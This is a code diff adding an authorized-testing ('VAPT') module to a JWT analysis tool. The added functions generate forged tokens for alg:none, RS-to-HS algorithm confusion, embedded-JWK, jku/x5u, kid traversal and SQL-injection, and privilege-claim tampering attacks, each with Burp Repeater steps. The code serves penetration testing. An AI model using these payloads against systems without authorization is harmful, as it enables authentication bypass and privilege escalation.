@@ -29,6 +29,11 @@
        never sends them;
      - a bounded HMAC secret search (HS256/384/512 only) that runs in a
        Web Worker with progress, cancel and time/candidate limits.
+   VAPT scope:
+     - context-aware authorized-testing suggestions derived from the
+       analyzed token (vaptRecommendations) and the matching one-click
+       test payloads (buildVaptPayload) for manual verification in an
+       intercepting proxy. Suggestions are test vectors, never findings.
    The engine never sends a JWT anywhere: no fetch of a JWKS URL, no
    target requests, no network/storage, and alg:none stays rejected by
    parseToken and signToken (it exists only as a labelled template).
@@ -729,6 +734,289 @@
     });
   }
 
+  /* ======================================================================
+     VAPT recommendations — context-aware authorized-testing suggestions
+     ====================================================================== */
+
+  /* Claim names that commonly carry authorization/ privilege meaning. A
+     token holding any of these is a candidate for a tamper / privilege-
+     escalation check. Top-level, case-insensitive. */
+  var PRIVILEGE_CLAIMS = [
+    "admin", "is_admin", "isadmin", "role", "roles", "scope", "scopes",
+    "permission", "permissions", "perms", "groups", "group", "authorities",
+    "entitlements", "superuser", "root"
+  ];
+
+  function hasOwn(obj, key) { return Object.prototype.hasOwnProperty.call(obj, key); }
+
+  function privilegeClaimsIn(payload) {
+    var found = [];
+    Object.keys(payload || {}).forEach(function (k) {
+      if (PRIVILEGE_CLAIMS.indexOf(k.toLowerCase()) !== -1) found.push(k);
+    });
+    return found;
+  }
+
+  /* Read the parsed token (and only the parsed token — never the network)
+     and return the prioritized VAPT suggestion cards for manual
+     verification in an intercepting proxy. Pure data: the controller owns
+     all DOM. One suggestion = one card:
+       id          stable rule id (tests pin these)
+       severity    "critical" | "high" | "info"  (rendered as a tag)
+       title       short name of the test vector
+       why         why the vector applies to THIS token
+       action      "build" (one-click payload) | "edit" (route to
+                   Edit & Generate) | "secret" (route to Secret Test)
+       payload     buildVaptPayload kind when action is "build"
+       actionLabel the one-click button label
+       tab         panel the refine button opens: "variants" | "edit" | "secret"
+       refineLabel label of the tab-jump button
+       needsPem    card carries an inline RSA public-key field
+       howTo       2-3 bullets: how to verify in Burp Repeater and which
+                   response signals a vulnerability
+     Suggestions are contextual test vectors, never findings — only the
+     target's behavior decides whether any of them matters. */
+  function vaptRecommendations(parsed) {
+    if (!parsed || !parsed.header || !parsed.payload) return [];
+    var h = parsed.header, p = parsed.payload;
+    var alg = String(h.alg || "");
+    var spec = algSpec(alg);
+    var out = [];
+    function add(s) { out.push(s); }
+
+    if (/^RS(256|384|512)$/.test(alg)) {
+      add({
+        id: "alg-confusion",
+        severity: "critical",
+        title: "Algorithm confusion: " + alg + " → HS256",
+        why: "The token is " + alg + ". If the verifier picks the algorithm " +
+          "from the token header and has the RSA public key configured where " +
+          "an HMAC secret is expected, an HS256 token signed with that public " +
+          "key (PEM/SPKI text) verifies as genuine.",
+        action: "build",
+        payload: "alg-confusion",
+        actionLabel: "Build RS-to-HMAC payload",
+        tab: "variants",
+        refineLabel: "Refine in Test Variants",
+        needsPem: true,
+        howTo: [
+          "Paste the server's RSA public key (PEM/SPKI), build the payload, then in Burp Repeater replace the Authorization token and resend the original request.",
+          "Vulnerable signal: the HS256-forged request returns exactly what the genuine token returned (e.g. HTTP 200 with data) instead of 401/403 — the server confused the public key with an HMAC secret.",
+          "If it is rejected, repeat with algorithm HS384/HS512 in the Test Variants tab; some stacks pin only one HMAC digest."
+        ]
+      });
+    }
+
+    add({
+      id: "alg-none",
+      severity: "critical",
+      title: "Signature stripping: alg:none",
+      why: "The token is signed (" + alg + "). RFC 7515 allows alg:none and " +
+        "some libraries still honor it, or match the algorithm " +
+        "case-insensitively (\"none\" / \"None\" / \"NONE\") with no " +
+        "signature segment at all.",
+      action: "build",
+      payload: "alg-none",
+      actionLabel: "Build alg:none payload",
+      tab: "variants",
+      refineLabel: "Refine in Test Variants",
+      howTo: [
+        "Send the unsigned payload in Burp Repeater in place of the real token (Authorization: Bearer …).",
+        "Vulnerable signal: HTTP 200 where the signed token also passed — the backend accepted a token with no signature. 401/403 means the signature is enforced.",
+        "Also retry with the header alg spelled \"None\"/\"NONE\" (edit the base64url header) — weak verifiers sometimes whitelist only one casing."
+      ]
+    });
+
+    add({
+      id: "embedded-jwk",
+      severity: "high",
+      title: "Embedded JWK header injection",
+      why: "The JWS \"jwk\" header parameter lets a token bring its own " +
+        "public key. Verifiers that trust it will accept a token signed by " +
+        "any attacker-generated key pair.",
+      action: "build",
+      payload: "embedded-jwk",
+      actionLabel: "Build embedded-JWK payload",
+      tab: "variants",
+      refineLabel: "Refine in Test Variants",
+      howTo: [
+        "The payload embeds a freshly generated local RSA public key and is self-signed with the matching private key — no server key needed.",
+        "Send it in Burp Repeater. Vulnerable signal: HTTP 200 — the server trusted the client-supplied jwk header instead of its own key ring. 401/403 means the header is ignored or pinned.",
+        "Open the payload in Test Variants to copy the embedded public JWK or swap in a key shaped like the server's."
+      ]
+    });
+
+    var kidPresent = h.kid != null;
+    add({
+      id: "kid",
+      severity: kidPresent ? "high" : "info",
+      title: "Key ID (kid) manipulation",
+      why: kidPresent
+        ? "The header carries kid \"" + String(h.kid) + "\". If the server " +
+          "maps kid straight into a file path or SQL query, ../../dev/null " +
+          "or a tautology (1' OR 1=1--) hijacks key selection."
+        : "No kid header — defense-in-depth: add one and probe whether the " +
+          "server's key-selection path handles it unsafely.",
+      action: "build",
+      payload: "kid",
+      actionLabel: "Build kid test payload",
+      tab: "variants",
+      refineLabel: "Refine in Test Variants",
+      howTo: [
+        "Send the payload in Burp Repeater: it mutates kid and keeps the token's original signature, which still exposes verifiers that resolve the key id before checking the signature — watch error pages, stack traces and timing for traversal/SQL tells.",
+        "For a strict /dev/null oracle, re-sign in Test Variants: kid = ../../../dev/null with an empty-file HMAC secret on HS* tokens. Vulnerable signal: HTTP 200 (forged token accepted) or a file-read error in the response.",
+        "Also try the SQL-style kid — 1' OR 1=1-- — a 500-level error or a boolean difference vs the usual 401/403 means kid reaches a query unsanitized."
+      ]
+    });
+
+    var urlParam = h.jku ? "jku" : (h.x5u ? "x5u" : null);
+    add({
+      id: "jku-x5u",
+      severity: "high",
+      title: "Key-URL injection (jku / x5u)",
+      why: urlParam
+        ? "The token already declares a " + urlParam + " URL. Check the " +
+          "server pins it to an allow-listed origin — if not, point it at a " +
+          "key set you control."
+        : "The header has no jku/x5u. Test whether the server would follow " +
+          "one to an untrusted endpoint and take its key material as trusted.",
+      action: "build",
+      payload: "jku",
+      actionLabel: "Build JKU/X5U payload",
+      tab: "variants",
+      refineLabel: "Refine in Test Variants",
+      needsUrl: true,
+      howTo: [
+        "The payload is self-signed with a local throwaway RSA pair and points jku/x5u at your URL — host the shown public JWK there (JWKS form: {\"keys\":[ … ]}).",
+        "Send it in Burp Repeater. Vulnerable signal: HTTP 200 — and an inbound hit on your endpoint proves the server fetched an untrusted key URL. 401/403 with no inbound hit means URL fetching is pinned or blocked.",
+        "Never point this at a host you do not control; CyberBuddy itself makes no request to the URL."
+      ]
+    });
+
+    if (spec && spec.kty === "oct") {
+      add({
+        id: "hmac-secret",
+        severity: "high",
+        title: "Offline HMAC secret testing",
+        why: "The token is " + alg + " — anyone holding the shared secret " +
+          "can forge it. A weak secret falls to an offline dictionary test " +
+          "that never touches the target.",
+        action: "secret",
+        actionLabel: "Launch secret test",
+        tab: "secret",
+        refineLabel: "Open Secret Test",
+        howTo: [
+          "Runs locally in a Web Worker against the token's signature: built-in common keys first, then your wordlist, with time and candidate bounds.",
+          "Vulnerable signal: a candidate matches — you can now sign arbitrary claims in Edit & Generate and replay them in Burp Repeater (HTTP 200 on a forged token confirms impact).",
+          "No match only means the secret is not in this candidate set — it proves nothing about secret strength."
+        ]
+      });
+    }
+
+    var privClaims = privilegeClaimsIn(p);
+    if (privClaims.length) {
+      add({
+        id: "claim-tamper",
+        severity: "high",
+        title: "Claim tampering & privilege escalation",
+        why: "Authorization-bearing claims present: " + privClaims.join(", ") +
+          ". Flip them (role→admin, admin:true, wider scopes) and see whether " +
+          "the server actually verifies the signature, or trust follows an " +
+          "alg:none / confusion bypass above.",
+        action: "edit",
+        actionLabel: "Edit & re-sign",
+        tab: "edit",
+        refineLabel: "Open Edit & Generate",
+        claims: privClaims,
+        howTo: [
+          "Edit the claim values, then either keep the original signature (Test Variants → tamper) to check the server verifies at all, or re-sign with a key you control — then replay in Burp Repeater.",
+          "Vulnerable signal: the tampered token returns HTTP 200 with elevated access (admin data, new permissions) instead of 401/403."
+        ]
+      });
+    }
+
+    var now = Math.floor(Date.now() / 1000);
+    var noExp = !hasOwn(p, "exp");
+    var longLived = typeof p.exp === "number" && typeof p.iat === "number"
+      && (p.exp - p.iat) > 24 * 3600;
+    if (noExp || longLived) {
+      add({
+        id: "lifetime",
+        severity: "info",
+        title: "Replay window & lifetime checks",
+        why: noExp
+          ? "The token has no exp — it never expires, so a leak is a " +
+            "permanent credential unless the server revokes out-of-band."
+          : "Issued lifetime exceeds 24 hours (" +
+            Math.round((p.exp - p.iat) / 3600) + "h) — a long replay window " +
+            "if the token leaks.",
+        action: "edit",
+        actionLabel: "Edit & re-sign",
+        tab: "edit",
+        refineLabel: "Open Edit & Generate",
+        howTo: [
+          "In Burp Repeater, replay this exact token after logout / rotation and past exp — Vulnerable signal: HTTP 200 where 401 is expected means revocation or expiry is not enforced.",
+          "Extend exp in Edit & Generate (re-sign or tamper) to test whether exp is honored at all; " + now + " is the current epoch second for reference."
+        ]
+      });
+    }
+
+    return out;
+  }
+
+  /* One entry point for the VAPT one-click payloads. Resolves
+     {type, token, header, payload, note} or {error}. Kinds:
+       alg-none        — signature stripped (buildVariant template)
+       alg-confusion   — opts.publicKeyPem as the HS256 secret
+       embedded-jwk    — opts {publicJwk, alg, key}
+       jku / x5u       — opts {url, alg, key}
+       kid             — opts.kid; ORIGINAL signature kept, so it needs no
+                         key at all — it probes whether the target resolves
+                         the key id before it verifies the signature.
+     Re-signed kinds inherit every signToken guard (no public-key signing,
+     no alg:none, alg always pinned). OUTPUT IS ALWAYS A TEST PAYLOAD. */
+  function buildVaptPayload(parsed, kind, opts) {
+    opts = opts || {};
+    if (!parsed || !parsed.header || !parsed.payload) {
+      return Promise.resolve({ error: "Paste and decode a base token first — VAPT payloads build on the analyzed token." });
+    }
+    if (kind === "alg-none") return buildVariant(parsed, "alg-none", {});
+    if (kind === "alg-confusion") {
+      return buildVariant(parsed, "alg-confusion", { publicKeyPem: opts.publicKeyPem });
+    }
+    if (kind === "embedded-jwk" || kind === "jku" || kind === "x5u") {
+      // Self-signed probes: the header must declare the algorithm the
+      // payload is actually signed with (the alg switch is part of the
+      // test), otherwise signToken's alg guard rightly rejects the build.
+      var signAlg = opts.alg || "RS256";
+      var base = {
+        header: cloneJson(parsed.header),
+        payload: cloneJson(parsed.payload),
+        signature: parsed.signature,
+        signingInput: parsed.signingInput
+      };
+      base.header.alg = signAlg;
+      if (kind === "embedded-jwk") {
+        return buildVariant(base, kind, { publicJwk: opts.publicJwk, alg: signAlg, key: opts.key });
+      }
+      return buildVariant(base, kind, { url: opts.url, alg: signAlg, key: opts.key });
+    }
+    if (kind === "kid") {
+      try {
+        var header = cloneJson(parsed.header);
+        header.kid = opts.kid == null || opts.kid === "" ? "../../../dev/null" : String(opts.kid);
+        var t = tamperToken(parsed, header, cloneJson(parsed.payload));
+        return Promise.resolve({
+          type: "kid", token: t.token, header: t.header, payload: t.payload,
+          note: "Mutated kid header, original signature kept — probes whether the target resolves the key id before verifying the signature."
+        });
+      } catch (e) {
+        return Promise.resolve({ error: e.message });
+      }
+    }
+    return Promise.resolve({ error: "Unknown VAPT payload kind: " + kind });
+  }
+
   function timingSafeEqual(a, b) {
     var d = 0;
     for (var i = 0; i < a.length; i++) d |= a[i] ^ b[i];
@@ -918,6 +1206,8 @@
     diffClaims: diffClaims,
     randomJti: randomJti,
     buildVariant: buildVariant,
+    vaptRecommendations: vaptRecommendations,
+    buildVaptPayload: buildVaptPayload,
     unsignedToken: unsignedToken,
     tamperToken: tamperToken,
     algorithmConfusionToken: algorithmConfusionToken,
